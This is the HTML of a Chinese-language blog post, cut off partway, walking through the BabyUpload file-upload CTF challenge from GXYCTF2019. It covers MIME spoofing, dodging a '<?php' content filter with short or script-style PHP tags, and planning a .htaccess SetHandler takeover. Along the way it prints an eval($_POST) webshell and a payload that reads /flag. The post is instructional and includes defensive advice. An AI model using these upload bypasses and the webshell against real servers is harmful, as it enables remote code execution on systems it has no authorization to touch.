@@ -1,0 +1,1154 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析 | Quellisya's Blog</title><meta name="author" content="Quellisya"><meta name="copyright" content="Quellisya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f3fbf8"><meta name="description" content="直接传被 MIME 检查拦下，改包后又被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析">
+<meta property="og:url" content="https://quellisya.github.io/2026/11/18/web-ctf-upload-babyupload/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="直接传被 MIME 检查拦下，改包后又被">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/img/avatar-seal.svg">
+<meta property="article:published_time" content="2026-11-18T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-18T02:00:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content=".htaccess">
+<meta property="article:tag" content="GXYCTF">
+<meta property="article:tag" content="MIME 伪造">
+<meta property="article:tag" content="PHP 短标签">
+<meta property="article:tag" content="SetHandler">
+<meta property="article:tag" content="上传竞态">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/img/avatar-seal.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析",
+  "url": "https://quellisya.github.io/2026/11/18/web-ctf-upload-babyupload/",
+  "image": "https://quellisya.github.io/img/avatar-seal.svg",
+  "datePublished": "2026-11-18T02:00:00.000Z",
+  "dateModified": "2026-11-18T02:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Quellisya",
+      "url": "https://github.com/Quellisya"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo-seal.svg"><link rel="canonical" href="https://quellisya.github.io/2026/11/18/web-ctf-upload-babyupload/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0f1f22')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f3fbf8')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/butterfly-custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-ink-tech.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/banner-ink-tech.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo-seal.svg" alt="Logo"><span class="site-name">Quellisya's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-18T02:00:00.000Z" title="发表于 2026-11-18 10:00:00">2026-11-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-18T02:00:00.000Z" title="更新于 2026-11-18 10:00:00">2026-11-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/file-upload/">文件上传</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fas fa-layer-group"></i>
+    <span class="series-nav__name">系列：文件上传</span>
+    <span class="series-nav__count">第 4 / 4 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-knowledge-upload-basics&#x2F;">文件上传基础：校验点、可执行后缀与常见坑</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-actf2020&#x2F;">[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-geek2019&#x2F;">[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;11&#x2F;18&#x2F;web-ctf-upload-babyupload&#x2F;">[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-geek2019&#x2F;"><i class="fas fa-arrow-left"></i>[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过</a></div>
+</nav><div class="note primary flat"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门（建议先看 <a href="/2026/10/24/web-knowledge-upload-basics/">文件上传基础</a> 和本系列前两篇）</li>
+<li><strong>考点</strong>：MIME 伪造、后缀黑名单、内容黑名单、<code>.htaccess</code> + <code>SetHandler</code>、上传-访问竞态、脚本化</li>
+<li><strong>四层检查</strong>：<code>Content-Type</code> 必须是 <code>image/jpeg</code>；文件名 <code>ph</code> 系列被拦；内容含 <code>&lt;?php</code> 被拦；<code>.png</code> 默认不会被 PHP 解析</li>
+<li><strong>路线</strong>：直接传被拦 → Burp 改 MIME → 换 <code>&lt;script language=&quot;php&quot;&gt;</code> → 传 <code>.htaccess</code> → 访问 <code>.png</code> 执行 → 脚本竞速</li>
+<li><strong>关键</strong>：<code>.htaccess</code> 和木马必须落在<strong>同一个上传目录</strong>；目录按会话生成，所以两次上传要用同一个 <code>Session</code></li>
+<li><strong>flag</strong>：<code>CTF2{7794c465-e40e-46e4-b07c-3ff142955943}</code></li>
+</ul>
+</div>
+
+<div class="note info flat"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：HTTP <code>multipart/form-data</code>、Burp 改包、PHP 基本语法、Python <code>requests</code></li>
+<li><strong>工具</strong>：Burp Suite（Repeater &#x2F; Proxy）、Python 3、<code>requests</code></li>
+<li><strong>环境</strong>：文中的靶场地址是当时的临时环境，现在多半已经失效。文末给了一个 <strong>Docker + Apache + PHP 5.6 的本地复现实验</strong>，可以完整跑通本文的脚本</li>
+<li>本文所有操作仅用于<strong>授权靶场和本地环境</strong>，请勿对未授权的目标做任何测试</li>
+</ul>
+</div>
+
+<div class="note default flat"><p><strong>做题路线</strong></p>
+<p><code>看上传框</code> → <code>直接传被 MIME 拦</code> → <code>Burp 改 Content-Type</code> → <code>试 &lt;?php 被内容检查拦</code> → <code>换 &lt;script language=&quot;php&quot;&gt;</code> → <code>发现 .png 不执行</code> → <code>404 暴露 Apache</code> → <code>传 .htaccess</code> → <code>脚本竞速拿 flag</code></p>
+</div>
+
+<h2 id="题目：一个朴素的上传框"><a href="#题目：一个朴素的上传框" class="headerlink" title="题目：一个朴素的上传框"></a>题目：一个朴素的上传框</h2><p>打开靶场，页面只有一个上传框：</p>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/01-upload-form.png" alt="BabyUpload 上传页面"></p>
+<p><em>图 1：页面没有多余提示，只有一个文件选择框和“上传”按钮</em></p>
+<p>这类题没有花哨的前端，所有线索都在<strong>服务端的回显</strong>里。先把已知信息记下来：</p>
+<table>
+<thead>
+<tr>
+<th>线索</th>
+<th>值</th>
+<th>从哪来</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>上传字段名</td>
+<td><code>uploaded</code></td>
+<td>Burp 里看 <code>Content-Disposition: form-data; name=&quot;uploaded&quot;</code></td>
+</tr>
+<tr>
+<td>上传目录</td>
+<td><code>/var/www/html/upload/&lt;hash&gt;/</code></td>
+<td>上传成功后的回显</td>
+</tr>
+<tr>
+<td>Web 路径</td>
+<td><code>/upload/&lt;hash&gt;/&lt;文件名&gt;</code></td>
+<td>把绝对路径里的 <code>/var/www/html</code> 换成站点根</td>
+</tr>
+<tr>
+<td>服务器</td>
+<td><code>Apache/2.4.10 (Debian)</code></td>
+<td>后面 404 页面的页脚</td>
+</tr>
+<tr>
+<td>PHP 版本</td>
+<td><code>5.6.23</code></td>
+<td>响应头 <code>X-Powered-By</code></td>
+</tr>
+<tr>
+<td>清理机制</td>
+<td>约 3 秒清一次上传目录</td>
+<td>手工复现时文件很快消失</td>
+</tr>
+</tbody></table>
+<p>这道题的核心不是“传一个 <code>.php</code> 上去”这么简单，而是<strong>四层检查逐层过</strong>：</p>
+<ol>
+<li><strong>MIME 类型</strong>：不是 <code>image/jpeg</code> 就拒绝；</li>
+<li><strong>文件名</strong>：<code>php</code> &#x2F; <code>phtml</code> 这一族后缀被拦；</li>
+<li><strong>文件内容</strong>：出现 <code>&lt;?php</code> 标记就拒绝；</li>
+<li><strong>执行</strong>：就算文件落盘，<code>.png</code> 也不会被 PHP 解析。</li>
+</ol>
+<p>前三层决定“能不能传上去”，第四层决定“传上去有没有用”。很多人卡在第三层，更多人卡在第四层。</p>
+<h2 id="第一层：MIME-类型检查"><a href="#第一层：MIME-类型检查" class="headerlink" title="第一层：MIME 类型检查"></a>第一层：MIME 类型检查</h2><p>先按最朴素的方式，传一个内容为 PHP 的 <code>.png</code>。页面直接回：</p>
+<blockquote>
+<p>上传类型也太露骨了吧！</p>
+</blockquote>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/02-type-blocked.png" alt="直接上传被类型检查拦下"></p>
+<p><em>图 2：上传后页面提示“上传类型也太露骨了吧！”，文件没有落盘</em></p>
+<p>这句提示说明服务端在检查 <strong>MIME 类型</strong>。浏览器上传文件时，会根据后缀自动填一个 <code>Content-Type</code>：</p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>浏览器通常声明的 <code>Content-Type</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>shell.png</code></td>
+<td><code>01-upload-form.png</code></td>
+</tr>
+<tr>
+<td><code>shell.jpg</code> &#x2F; <code>shell.jpeg</code></td>
+<td><code>image/jpeg</code></td>
+</tr>
+<tr>
+<td><code>shell.php</code></td>
+<td><code>application/x-php</code> 或 <code>text/plain</code></td>
+</tr>
+<tr>
+<td><code>.htaccess</code></td>
+<td>空或 <code>application/octet-stream</code></td>
+</tr>
+</tbody></table>
+<p>服务端大概率只认 <code>image/jpeg</code> 这一个值，所以 <code>.png</code> 的 <code>01-upload-form.png</code> 也被拒了。这不是“后缀白名单”，而是<strong>把某一个 MIME 写死</strong>。</p>
+<h3 id="为什么-MIME-检查靠不住"><a href="#为什么-MIME-检查靠不住" class="headerlink" title="为什么 MIME 检查靠不住"></a>为什么 MIME 检查靠不住</h3><p>关键点：<code>Content-Type</code> 是<strong>请求里的一个普通字段</strong>，由客户端填写。浏览器确实会按后缀自动填，但攻击者可以：</p>
+<ul>
+<li>用 Burp 截包，直接改；</li>
+<li>用 <code>curl -F</code> 指定；</li>
+<li>用 Python <code>requests</code> 的 <code>files=</code> 元组指定。</li>
+</ul>
+<p>所以服务端读到的 <code>$_FILES[&#39;uploaded&#39;][&#39;type&#39;]</code>，本质上和 <code>filename</code> 一样，都是<strong>用户可控的字符串</strong>。只检查它，等于让用户自己声明“我是好人”。</p>
+<div class="note warning flat"><p><strong>别把“浏览器自动填的”当成“服务器验证过的”。</strong></p>
+<p><code>Content-Type</code>、<code>filename</code>、文件内容全都在请求体里，客户端想写什么就写什么。真正的服务端校验应该用 <code>finfo_file()</code> 读文件真实类型，或者用 <code>getimagesize()</code> 确认它是不是一张能解析的图片。只比较 <code>$_FILES[&#39;type&#39;]</code> 是典型的“信任客户端”。</p>
+</div>
+
+<h2 id="第二层：文件名和后缀黑名单"><a href="#第二层：文件名和后缀黑名单" class="headerlink" title="第二层：文件名和后缀黑名单"></a>第二层：文件名和后缀黑名单</h2><p>把请求送进 Burp Repeater，先只改 <code>Content-Type</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;uploaded&quot;; filename=&quot;exploit.png&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br></pre></td></tr></table></figure>
+
+<p>请求体先放一个 PHP 5 的老式标签：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发送后上传成功：</p>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/03-burp-upload.png" alt="Burp 改 MIME 后上传成功"></p>
+<p><em>图 3：<code>filename=&quot;exploit.png&quot;</code>、<code>Content-Type: image/jpeg</code>，文件成功写入 <code>/var/www/html/upload/e780.../exploit.png</code></em></p>
+<p>这一步同时说明两件事：</p>
+<ol>
+<li><strong>MIME 检查被绕过了</strong>：服务端只看请求里的 <code>Content-Type</code>；</li>
+<li><strong><code>.png</code> 后缀不在黑名单里</strong>：文件名检查至少没有拦 <code>.png</code>。</li>
+</ol>
+<p>题目对文件名的过滤，实测是把 <code>ph</code> 这一族按死了：</p>
+<table>
+<thead>
+<tr>
+<th>后缀</th>
+<th>能否上传</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.php</code></td>
+<td>✗</td>
+<td>最直接的可执行后缀，必拦</td>
+</tr>
+<tr>
+<td><code>.phtml</code> &#x2F; <code>.pht</code> &#x2F; <code>.phar</code></td>
+<td>✗</td>
+<td>同属 <code>ph</code> 系列，通常一起拦</td>
+</tr>
+<tr>
+<td><code>.png</code></td>
+<td>✓</td>
+<td>图片后缀，能过文件名检查</td>
+</tr>
+<tr>
+<td><code>.jpg</code> &#x2F; <code>.jpeg</code></td>
+<td>✓</td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>.htaccess</code></td>
+<td>✓</td>
+<td>没有常规后缀，反而容易漏</td>
+</tr>
+</tbody></table>
+<p>但这里要停一下：<strong><code>.png</code> 能上传，不代表它能执行。</strong> 后面第四层会专门处理这个问题。</p>
+<div class="note info flat"><p><strong>为什么题目要拦 <code>ph</code> 系列，却放过了 <code>.htaccess</code>？</strong></p>
+<p>因为出题人的思路是“只要不让你传可执行后缀，你就没办法”。但文件是否能执行，不只取决于后缀，还取决于<strong>服务器怎么解析这个目录</strong>。<code>.htaccess</code> 恰好能改解析规则，而且它本身没有 <code>.php</code> 后缀，正好从黑名单的缝里钻过去。</p>
+</div>
+
+<h2 id="第三层：内容黑名单"><a href="#第三层：内容黑名单" class="headerlink" title="第三层：内容黑名单"></a>第三层：内容黑名单</h2><p>MIME 和文件名都过了，接下来试最标准的 PHP 标签：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发送后页面回：</p>
+<blockquote>
+<p>诶，别蒙我啊，这标志明显还是php啊</p>
+</blockquote>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/04-php-blocked.png" alt="&lt;?php 被内容检查拦下"></p>
+<p><em>图 4：<code>filename=&quot;exploit.jpg&quot;</code>、<code>Content-Type: image/jpeg</code>，内容里的 <code>&lt;?php</code> 触发内容黑名单</em></p>
+<p>这句“这标志明显还是php啊”很关键：服务端不是在做图片完整性校验，而是在<strong>扫描文件内容里的特征字符串</strong>。它盯的很可能是 <code>&lt;?php</code> 这个开标签。</p>
+<p>那换一种 PHP 写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这次上传成功：</p>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/05-short-tag.png" alt="短标签上传成功"></p>
+<p><em>图 5：把 <code>&lt;?php</code> 换成 <code>&lt;?</code>，文件成功写入 <code>.../exploit.jpg</code></em></p>
+<p>对比两次结果：</p>
+<table>
+<thead>
+<tr>
+<th>内容</th>
+<th>结果</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php echo ...; ?&gt;</code></td>
+<td>被拦</td>
+<td>命中 <code>&lt;?php</code> 标记</td>
+</tr>
+<tr>
+<td><code>&lt;? echo ...; ?&gt;</code></td>
+<td>上传成功</td>
+<td>没有 <code>&lt;?php</code> 这个完整标记</td>
+</tr>
+<tr>
+<td><code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></td>
+<td>上传成功</td>
+<td>含 <code>php</code>，但不含 <code>&lt;?php</code></td>
+</tr>
+</tbody></table>
+<p>所以内容黑名单拦的是 <strong><code>&lt;?php</code> 这个标记</strong>，不是笼统的 <code>php</code> 三个字母，也不是所有 <code>&lt;?</code>。</p>
+<p>但这个结论只解决“传上去”的问题，<strong>没解决“能不能执行”</strong>：</p>
+<ul>
+<li><code>&lt;? ... ?&gt;</code> 是 PHP 短标签，能不能执行取决于 <code>short_open_tag</code> 配置；</li>
+<li><code>.jpg</code> &#x2F; <code>.png</code> 后缀本身不会被 PHP 解析；</li>
+<li>文件现在只是躺在 upload 目录里。</li>
+</ul>
+<div class="note warning flat"><p><strong>“上传成功”和“代码执行”是两件事。</strong></p>
+<p>很多新手看到“succesfully uploaded”就以为拿下了，结果访问文件只看到源码、空白页或 404。判断标准只有一个：<strong>访问它，看服务端有没有真的执行 PHP</strong>。可以先用 <code>&lt;?php echo &quot;test123&quot;; ?&gt;</code> 这种无副作用的 payload 验证解析，再上真正读 flag 的代码。</p>
+<p>注意：本题的 <code>&lt;?php</code> 会被内容黑名单拦，所以验证时要么用 <code>&lt;script language=&quot;php&quot;&gt;echo &quot;test123&quot;;&lt;/script&gt;</code>，要么用 <code>&lt;? echo &quot;test123&quot;; ?&gt;</code>（前提是短标签开启）。</p>
+</div>
+
+<h3 id="顺带补一张-PHP-开标签表"><a href="#顺带补一张-PHP-开标签表" class="headerlink" title="顺带补一张 PHP 开标签表"></a>顺带补一张 PHP 开标签表</h3><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>含 <code>&lt;?php</code></th>
+<th>PHP 5.6</th>
+<th>PHP 7+</th>
+<th>本题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php ... ?&gt;</code></td>
+<td>是</td>
+<td>✅</td>
+<td>✅</td>
+<td>内容黑名单拦截</td>
+</tr>
+<tr>
+<td><code>&lt;? ... ?&gt;</code></td>
+<td>否</td>
+<td>需 <code>short_open_tag=On</code></td>
+<td>需开启</td>
+<td>能上传，执行看配置</td>
+</tr>
+<tr>
+<td><code>&lt;?= ... ?&gt;</code></td>
+<td>否</td>
+<td>✅</td>
+<td>✅</td>
+<td>只能输出，不能写复杂逻辑</td>
+</tr>
+<tr>
+<td><code>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;</code></td>
+<td>否</td>
+<td>✅</td>
+<td>❌ 已移除</td>
+<td>能上传，本题 PHP 5.6 可执行</td>
+</tr>
+</tbody></table>
+<p>本题服务器的 <code>X-Powered-By</code> 是 <code>PHP/5.6.23</code>，所以 <code>&lt;script language=&quot;php&quot;&gt;</code> 可用。这也是最终脚本选它的原因：<strong>不依赖 <code>short_open_tag</code>，比 <code>&lt;?</code> 稳。</strong></p>
+<h2 id="第四层：上传成功，但-png-不会执行"><a href="#第四层：上传成功，但-png-不会执行" class="headerlink" title="第四层：上传成功，但 .png 不会执行"></a>第四层：上传成功，但 .png 不会执行</h2><p>现在文件已经传上去了，回显还给了绝对路径：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png succesfully uploaded!</span><br></pre></td></tr></table></figure>
+
+<p>把它换成 Web 路径访问：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;靶场地址&gt;/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png</span><br></pre></td></tr></table></figure>
+
+<p>结果通常是以下几种之一：</p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>浏览器直接显示 PHP 源码</td>
+<td>文件被当静态文本返回，没有执行</td>
+</tr>
+<tr>
+<td>下载文件</td>
+<td>同上，<code>Content-Type</code> 是图片或二进制</td>
+</tr>
+<tr>
+<td>空白页</td>
+<td>可能执行了但没输出，也可能没执行</td>
+</tr>
+<tr>
+<td>页面出现 <code>test123</code></td>
+<td>真的执行了</td>
+</tr>
+</tbody></table>
+<p>因为后缀是 <code>.png</code>，Apache 默认会把它交给静态文件处理器（或图片处理器），<strong>不会交给 PHP</strong>。这就是“上传成功但没用”的根本原因。</p>
+<p>要让 <code>.png</code> 执行，得改<strong>服务器对这个目录的解析规则</strong>。这正是 <code>.htaccess</code> 的用武之地。</p>
+<h2 id="第五层：从-404-页面发现-Apache"><a href="#第五层：从-404-页面发现-Apache" class="headerlink" title="第五层：从 404 页面发现 Apache"></a>第五层：从 404 页面发现 Apache</h2><p>在传 <code>.htaccess</code> 之前，先确认服务器是不是 Apache。访问一个不存在的路径，比如：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;靶场地址&gt;/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/06-apache-404.png" alt="访问 &#x2F;flag 的 404 页面"></p>
+<p><em>图 6：<code>The requested URL /flag was not found on this server.</code>，页脚写着 <code>Apache/2.4.10 (Debian) Server</code></em></p>
+<p>这个页面透露了两件事：</p>
+<ol>
+<li><strong>flag 不在 Web 根目录</strong>，直接访问 <code>/flag</code> 是 404——它只存在于文件系统根目录，得靠代码去读；</li>
